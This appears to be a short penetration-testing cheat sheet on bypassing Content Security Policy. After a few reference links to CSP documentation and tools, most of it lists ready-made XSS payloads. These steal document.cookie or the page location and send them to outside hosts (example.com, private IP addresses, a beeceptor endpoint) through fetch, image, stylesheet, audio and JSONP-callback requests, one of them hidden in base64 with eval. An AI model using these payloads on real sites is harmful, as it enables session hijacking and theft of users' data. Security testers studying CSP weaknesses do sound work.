# Content Security Policy

https://content-security-policy.com/#directive
https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy

https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#csp-is-not-a-substitute-for-secure-development


## CSP Generator
https://report-uri.com/home/generate

## CSP Tester
https://csp-evaluator.withgoogle.com/

## Bypass CSP 

via JSONB
https://github.com/zigoo0/JSONBee

Data 

```js
<script src="data:application/javascript,alert(1)"></script>
```

AJAX Fetch

```js
<script>fetch('http://example.com/${document.cookie}')</script>
<script>fetch('http://example.com/' + docment.cookie)</script>
```

IMG
```js
<script>(new Image()).src = `https://example.com/${encodeURIComponent(document.cookie)}`</script>
```

Nonce + CSS

```js
<script nonce="abcdef">
document.write('<link rel="stylesheet" type="text/css" href="http://10.8.189.220/' + document.cookie +'">')
</script>
```

IMG DOM

```js
<script>document.write('<img src="http://192.168.178.41/' +document.cookie+'">');</script>
```

JSONB

```js
<script src="https://accounts.google.com/o/oauth2/revoke?callback=fetch(`http://192.168.178.41/${document.location}`)"></script>
```

JSONB and Base64

```js
<script src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob('aW1nPW5ldyBJbWFnZTtpbWcuc3JjPWBodHRwOi8vMTAuOC4xODkuMjIwLyR7ZG9jdW1lbnQuY29va2llfWA7'))"></script>


<script>
//img=new Image;img.src=`http://10.8.189.220/${document.cookie}`;

//eval(atob('aW1nPW5ldyBJbWFnZTtpbWcuc3JjPWBodHRwOi8vMTAuOC4xODkuMjIwLyR7ZG9jdW1lbnQuY29va2llfWA7'))
</script>
```

Media

```js
<script src="/'; new Audio('https://stroke.free.beeceptor.com/' + document.cookie); '"></script>
```